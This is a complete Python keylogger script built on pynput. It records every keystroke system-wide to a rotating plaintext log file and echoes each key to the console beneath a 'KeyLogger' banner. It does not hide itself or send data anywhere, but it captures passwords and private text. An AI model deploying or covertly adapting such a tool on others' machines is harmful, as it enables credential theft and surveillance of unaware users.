import logging
from datetime import datetime
from pynput.keyboard import Key, Listener
from logging.handlers import RotatingFileHandler
from colorama import Fore, Back, Style, init
import time

# Initialize colorama for colored output
init(autoreset=True)

# Constants for logging
LOG_FILE = "key_log.txt"
LOG_MAX_SIZE = 5 * 1024  # Max 5 KB per log
BACKUP_COUNT = 3  # Keep up to 3 backup logs

# Set up logging with file rotation
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(message)s",
    handlers=[
        RotatingFileHandler(LOG_FILE, maxBytes=LOG_MAX_SIZE, backupCount=BACKUP_COUNT)
    ],
)

def display_startup_banner():
    """
    Displays a dynamic startup banner in the console.
    """
    banner = f"""
{Fore.CYAN}

  _  __              _                                      
 | |/ /             | |                                     
 | ' /  ___  _   _  | |      ___    __ _   __ _   ___  _ __ 
 |  <  / _ \| | | | | |     / _ \  / _` | / _` | / _ \| '__|
 | . \|  __/| |_| | | |____| (_) || (_| || (_| ||  __/| |   
 |_|\_\\___| \__, | |______|\___/  \__, | \__, | \___||_|   
              __/ |                 __/ |  __/ |            
             |___/                 |___/  |___/             

    
{Fore.GREEN}
      Keylogger is Active. Press Ctrl+C to Stop.
{Style.RESET_ALL}
    """
    print(banner)
    time.sleep(1)

def log_key_to_console(key_str):
    """
    Displays logged key information in an attractive format.
    """
    print(f"{Fore.YELLOW}[LOG]{Style.RESET_ALL} {Fore.CYAN}Key Pressed:{Style.RESET_ALL} {Fore.GREEN}{key_str}")

def process_key(key):
    """
    Process key press events and format them for logging.
    """
    try:
        key_str = str(key).replace("'", "")
        
        # Map special keys to user-friendly names
        key_mapping = {
            Key.space: "Space",
            Key.enter: "Enter",
            Key.tab: "Tab",
            Key.backspace: "Backspace",
            Key.shift: "Shift",
            Key.ctrl_l: "Left Ctrl",
            Key.ctrl_r: "Right Ctrl",
            Key.alt_l: "Left Alt",
            Key.alt_r: "Right Alt",
            Key.esc: "Escape",
        }
        key_str = key_mapping.get(key, key_str)
        
        # Log to file
        logging.info(key_str)
        
        # Log to console
        log_key_to_console(key_str)
    
    except Exception as e:
        logging.error(f"Error processing key: {e}")
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} {e}")

def start_keylogger():
    """
    Start the keylogger and display console updates attractively.
    """
    try:
        display_startup_banner()
        print(f"{Fore.GREEN}Keylogger is now capturing keystrokes...{Style.RESET_ALL}")
        with Listener(on_press=process_key) as listener:
            listener.join()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[STOPPED]{Style.RESET_ALL} Keylogger stopped by user.")
    except Exception as e:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} An unexpected error occurred: {e}")

if __name__ == "__main__":
    start_keylogger()
